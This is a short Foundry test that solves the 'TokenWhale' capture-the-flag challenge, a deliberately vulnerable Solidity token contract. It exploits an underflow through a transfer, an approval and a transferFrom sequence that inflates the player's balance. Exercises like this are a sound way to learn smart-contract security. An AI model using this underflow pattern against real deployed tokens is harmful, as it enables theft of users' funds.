// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
import "forge-std/Test.sol";
import "../../src/math/2.sol";
import "forge-std/console.sol";
contract TokenWhaleChallengeTest is Test {
    TokenWhaleChallenge target;
    address player;
    address player2;
    function setUp() public {
        player = vm.addr(1);
        player2 = vm.addr(2);
        vm.deal(player, 100 ether);
        vm.deal(player2, 100 ether);
        vm.label(player, "player");
        vm.label(player2, "player2");
        target = new TokenWhaleChallenge(player);
    }

    function testComplete() public {
        vm.prank(player);
        target.transfer(player2, 501);
        
        vm.prank(player2);
        target.approve(player, 501);
        
        vm.prank(player);
        target.transferFrom(player2, player2, 501);
        
        assertTrue(target.isComplete());
    }
}